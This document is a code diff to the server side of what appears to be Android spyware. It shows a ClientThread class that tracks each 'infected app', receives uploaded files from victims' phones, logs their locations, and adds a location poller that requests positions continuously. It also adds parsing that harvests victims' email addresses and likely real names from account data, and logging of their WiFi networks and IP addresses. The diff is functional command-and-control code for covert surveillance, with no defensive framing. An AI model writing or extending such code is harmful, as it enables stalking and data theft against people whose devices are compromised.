@@ -11,30 +11,33 @@ public class ClientThread implements Runnable {
 
     private static final int SO_TIMEOUT = 60000;
 
-    private Logger logger, locationLogger, userLogger;
+    private Logger logger, threadLogger, locationLogger, accountLogger, wifiAPLogger;
     private Socket socket = null;
     private DataInputStream in;
     private DataOutputStream out;
     private Heartbeat heartbeat;
+    private LocationPoller locationPoller;
     private int threadPort;
     private String clientID;
     private String version;
     private String infectedApp;
     private String lastLocation;
-    private ArrayList<String> accountNames = new ArrayList<String>();
+    private ArrayList<String> guessedNames = new ArrayList<String>();
     private ArrayList<String> emailAddresses = new ArrayList<String>();
     private boolean listen;
 
-    public ClientThread(Socket socket, String wifiStatus, String audioStarted, String locationStarted, String clientID, String version, String infectedApp) {
+    public ClientThread(Socket socket, String clientID, String version, String infectedApp) {
         // initiate thread
+        this.socket = socket;
         this.clientID = clientID;
         this.version = version;
         this.infectedApp = infectedApp;
-        this.socket = socket;
         listen = true;
         logger = new Logger(Logger.LOG_TYPE_NORMAL, clientID);
+        threadLogger = new Logger(Logger.LOG_TYPE_THREADS, "threads");
         locationLogger = new Logger(Logger.LOG_TYPE_LOCATIONS, clientID);
-        userLogger = new Logger(Logger.LOG_TYPE_USERS, clientID);
+        accountLogger = new Logger(Logger.LOG_TYPE_ACCOUNTS, clientID);
+        wifiAPLogger = new Logger(Logger.LOG_WIFI_APS, clientID);
         threadPort = socket.getPort();
         logger.log("New client connected from: " + socket.getRemoteSocketAddress() + " v" + version);
         File directory = new File(clientID);
@@ -48,6 +51,8 @@ public class ClientThread implements Runnable {
     @Override
     public void run() {
         try {
+            threadLogger.log("");
+
             socket.setSoTimeout(SO_TIMEOUT);
             in = new DataInputStream(new BufferedInputStream(socket.getInputStream()));
             out = new DataOutputStream(new DataOutputStream(socket.getOutputStream()));
@@ -58,7 +63,9 @@ public class ClientThread implements Runnable {
 
             // Start heartbeat
             heartbeat = new Heartbeat(out);
+            locationPoller = new LocationPoller(out);
             heartbeat.start();
+            locationPoller.start();
 
             while (listen) {
                 // get header
@@ -116,6 +123,9 @@ public class ClientThread implements Runnable {
             if (heartbeat != null) {
                 heartbeat.setRunning(false);
             }
+            if (locationPoller != null) {
+                locationPoller.setRunning(false);
+            }
             try {
                 if (in != null) {
                     in.close();
@@ -137,6 +147,7 @@ public class ClientThread implements Runnable {
             sb.append(" has disconnected");
             logger.log(sb.toString());
             ConnectionHandler.clientThreads.remove(this);
+            threadLogger.log("");
         }
     }
 
@@ -146,11 +157,11 @@ public class ClientThread implements Runnable {
         byte[] bReceivedFile = bytes;
         // get extension in the form of bytes
         byte[] bFileName = Arrays.copyOfRange(bReceivedFile, 0, HEADER_SIZE);
-        // remove header from received logFile
+        // remove header from received globalLogFile
         bReceivedFile = Arrays.copyOfRange(bReceivedFile, HEADER_SIZE, bReceivedFile.length);
         // convert to filename to a string
         String strFileName = new String(bFileName, "UTF-8").trim();
-        // save the logFile to disk using Apache commons
+        // save the globalLogFile to disk using Apache commons
         File file = new File(clientID, strFileName);
         FileUtils.writeByteArrayToFile(file, bReceivedFile);
         logger.log("\r\nSuccesfully received " + strFileName);
@@ -163,11 +174,27 @@ public class ClientThread implements Runnable {
         if (message.startsWith("lat ")) {
             locationLogger.log(message);
             lastLocation = message;
-            return;
         }
         if (message.startsWith("Account ")) {
-            userLogger.log(message);
-            return;
+            String accountName = message.substring(
+                    message.indexOf("name=") + "name=".length(),
+                    message.indexOf(",")
+            );
+            if(accountName.contains("@") && accountName.contains(".")){
+                // entry is probably an email address
+                if(!emailAddresses.contains(accountName)) {
+                    emailAddresses.add(accountName);
+                }
+            } else if (!accountName.matches("WhatsApp") && !accountName.matches("LinkedIn")){
+                // entry is probably a name TODO more company names like the above
+                if(!guessedNames.contains(accountName)) {
+                    guessedNames.add(accountName);
+                }
+            }
+            accountLogger.log(message);
+        }
+        if (message.startsWith("Connected to: ") || message.startsWith("IP address")) {
+            wifiAPLogger.log(message);
         }
         logger.log(message);
     }
@@ -197,11 +224,23 @@ public class ClientThread implements Runnable {
     }
 
     public ArrayList<String> getEmailAddresses() {
-        return emailAddresses;
+        if(emailAddresses.size() > 0) {
+            return emailAddresses;
+        } else {
+            ArrayList<String> noEmailAddresses = new ArrayList<String>();
+            noEmailAddresses.add("no_email_addr_found");
+            return noEmailAddresses;
+        }
     }
 
-    public ArrayList<String> getAccountNames() {
-        return accountNames;
+    public ArrayList<String> getGuessedNames() {
+        if(guessedNames.size() > 0) {
+            return guessedNames;
+        } else {
+            ArrayList<String> noGuessedNames = new ArrayList<String>();
+            noGuessedNames.add("no_name_found");
+            return noGuessedNames;
+        }
     }
 
     public int getThreadPort() {
